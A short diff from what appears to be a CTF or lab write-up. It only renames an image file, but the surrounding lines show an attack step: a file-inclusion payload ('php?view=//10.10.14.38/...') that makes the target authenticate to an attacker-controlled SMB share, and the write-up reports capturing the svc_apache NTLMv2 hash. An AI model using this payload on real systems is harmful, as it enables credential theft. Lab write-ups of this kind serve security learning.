@@ -310,7 +310,7 @@ Capture NTLMv2 Hash:
 php?view=//10.10.14.38/gethackedlol
 ```
 
-<figure><img src="../../../.gitbook/assets/image (23) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:yellow;">We captured the NTLMv2 hash of svc\_apache!</mark>
 
